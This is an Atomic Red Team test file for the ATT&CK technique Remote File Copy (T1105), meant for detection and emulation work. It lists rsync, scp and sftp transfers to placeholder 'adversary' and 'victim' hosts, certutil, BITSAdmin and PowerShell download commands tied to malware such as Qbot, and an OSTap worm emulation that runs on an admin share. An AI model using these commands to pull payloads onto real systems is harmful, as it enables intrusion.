---
attack_technique: T1105
display_name: Remote File Copy

atomic_tests:
- name: rsync remote file copy (push)
  auto_generated_guid: 5f354c24-41dd-4bb0-81dd-50b2063f600f
  description: |
    Utilize rsync to perform a remote file copy (push)
  supported_platforms:
    - linux
    - macos
  input_arguments:
    local_path:
      description: Path of folder to copy
      type: Path
      default: /tmp/adversary-rsync/
    username:
      description: User account to authenticate on remote host
      type: String
      default: victim
    remote_host:
      description: Remote host to copy toward
      type: String
      default: victim-host
    remote_path:
      description: Remote path to receive rsync
      type: Path
      default: /tmp/victim-files
  executor:
    name: bash
    command: |
      rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}

- name: rsync remote file copy (pull)
  auto_generated_guid: 98a00afe-cbf1-4f1b-94d5-c278365fa5eb
  description: |
    Utilize rsync to perform a remote file copy (pull)
  supported_platforms:
    - linux
    - macos
  input_arguments:
    remote_path:
      description: Path of folder to copy
      type: Path
      default: /tmp/adversary-rsync/
    username:
      description: User account to authenticate on remote host
      type: String
      default: adversary
    remote_host:
      description: Remote host to copy from
      type: String
      default: adversary-host
    local_path:
      description: Local path to receive rsync
      type: Path
      default: /tmp/victim-files
  executor:
    name: bash
    command: |
      rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}

- name: scp remote file copy (push)
  auto_generated_guid: b482f00e-8fec-4c63-a966-f3ccbbd4484a
  description: |
    Utilize scp to perform a remote file copy (push)
  supported_platforms:
    - linux
    - macos
  input_arguments:
    local_file:
      description: Path of file to copy
      type: Path
      default: /tmp/adversary-scp
    username:
      description: User account to authenticate on remote host
      type: String
      default: victim
    remote_host:
      description: Remote host to copy toward
      type: String
      default: victim-host
    remote_path:
      description: Remote path to receive scp
      type: Path
      default: /tmp/victim-files/
  executor:
    name: bash
    command: |
      scp #{local_file} #{username}@#{remote_host}:#{remote_path}

- name: scp remote file copy (pull)
  auto_generated_guid: 236e8b07-ba27-4ce2-bccb-61a8f03de0da
  description: |
    Utilize scp to perform a remote file copy (pull)
  supported_platforms:
    - linux
    - macos
  input_arguments:
    remote_file:
      description: Path of file to copy
      type: Path
      default: /tmp/adversary-scp
    username:
      description: User account to authenticate on remote host
      type: String
      default: adversary
    remote_host:
      description: Remote host to copy from
      type: String
      default: adversary-host
    local_path:
      description: Local path to receive scp
      type: Path
      default: /tmp/victim-files/
  executor:
    name: bash
    command: |
      scp #{username}@#{remote_host}:#{remote_file} #{local_path}

- name: sftp remote file copy (push)
  auto_generated_guid: 46d0bb1b-8962-490e-b1c9-93de0161a643
  description: |
    Utilize sftp to perform a remote file copy (push)
  supported_platforms:
    - linux
    - macos
  input_arguments:
    local_file:
      description: Path of file to copy
      type: Path
      default: /tmp/adversary-sftp
    username:
      description: User account to authenticate on remote host
      type: String
      default: victim
    remote_host:
      description: Remote host to copy toward
      type: String
      default: victim-host
    remote_path:
      description: Remote path to receive sftp
      type: Path
      default: /tmp/victim-files/
  executor:
    name: bash
    command: |
      sftp #{username}@#{remote_host}:#{remote_path} <<< $'put #{local_file}'

- name: sftp remote file copy (pull)
  auto_generated_guid: 3ff16771-cdd1-4c3d-962f-2727d99c7746
  description: |
    Utilize sftp to perform a remote file copy (pull)
  supported_platforms:
    - linux
    - macos
  input_arguments:
    remote_file:
      description: Path of file to copy
      type: Path
      default: /tmp/adversary-sftp
    username:
      description: User account to authenticate on remote host
      type: String
      default: adversary
    remote_host:
      description: Remote host to copy from
      type: String
      default: adversary-host
    local_path:
      description: Local path to receive sftp
      type: Path
      default: /tmp/victim-files/
  executor:
    name: bash
    command: |
      sftp #{username}@#{remote_host}:#{remote_file} #{local_path}
- name: certutil download (urlcache)
  auto_generated_guid: b4ec5bcc-b3cc-44cc-8ab5-a38a27153c51
  description: |
    Use certutil -urlcache argument to download a file from the web. Note - /urlcache also works!
  supported_platforms:
    - windows
  input_arguments:
    remote_file:
      description: URL of file to copy
      type: Url
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
    local_path:
      description: Local path to place file
      type: Path
      default: Atomic-license.txt
  executor:
    name: command_prompt
    elevation_required: false
    command: |
      cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}
- name: certutil download (verifyctl)
  auto_generated_guid: 6e3ff814-56a0-482e-8342-7b1b89427628
  description: |
    Use certutil -verifyctl argument to download a file from the web. Note - /verifyctl also works!
  supported_platforms:
    - windows
  input_arguments:
    remote_file:
      description: URL of file to copy
      type: Url
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
    local_path:
      description: Local path to place file
      type: Path
      default: Atomic-license.txt
  executor:
    name: powershell
    elevation_required: false
    command: |
      $datePath = "certutil-$(Get-Date -format yyyy_MM_dd_HH_mm)"
      New-Item -Path $datePath -ItemType Directory
      Set-Location $datePath
      certutil -verifyctl -split -f #{remote_file}
      Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }

- name: Windows - BITSAdmin BITS Download
  auto_generated_guid: 7d7629ba-3591-4a02-b1fd-6a78f636884a
  description: |
    This test uses BITSAdmin.exe to schedule a BITS job for the download of a file.
    This technique is used by Qbot malware to download payloads.
  supported_platforms:
    - windows
  input_arguments:
    bits_job_name:
      description: Name of the created BITS job
      type: String
      default: qcxjb7
    remote_file:
      description: URL of file to copy
      type: Url
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
    local_path:
      description: Local path to place file
      type: Path
      default: Atomic-license.txt
  executor:
    name: command_prompt
    command: |
      C:\Windows\System32\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH #{remote_file} #{local_path}

- name: Windows - PowerShell Download
  auto_generated_guid: 8c31b39a-ed28-4b05-8417-a67314edf46c
  description: |
    This test uses PowerShell to download a payload.
    This technique is used by multiple adversaries and malware families.
  supported_platforms:
    - windows
  input_arguments:
    remote_file:
      description: URL of file to copy
      type: Url
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
    destination_path:
      description: Destination path to file
      type: Path
      default: $env:TEMP\Atomic-license.txt
  executor:
    name: powershell
    command: |
      (New-Object System.Net.WebClient).DownloadFile("#{remote_file}", "#{destination_path}")
    cleanup_command: |
      Remove-Item #{destination_path} -Force -ErrorAction Ignore

- name: OSTAP Worming Activity
  auto_generated_guid: 2a267648-2b89-4344-9365-94342dbfe1fe
  description: |
    OSTap copies itself in a specfic way to shares and secondary drives. This emulates the activity.
  supported_platforms:
    - windows
  input_arguments:
    destination_path:
      description: Path to create remote file at. Default is local admin share.
      type: String
      default: \\localhost\C$
  executor:
    name: command_prompt
    elevation_required: true
    command: |
       pushd #{destination_path}
       echo var fileObject = WScript.createobject("Scripting.FileSystemObject");var newfile = fileObject.CreateTextFile("AtomicTestFileT1105.js", true);newfile.WriteLine("This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.");newfile.Close(); > AtomicTestT1105.js
       CScript.exe AtomicTestT1105.js //E:JScript
       del AtomicTestT1105.js /Q >nul 2>&1
       del AtomicTestFileT1105.js /Q >nul 2>&1
       popd
       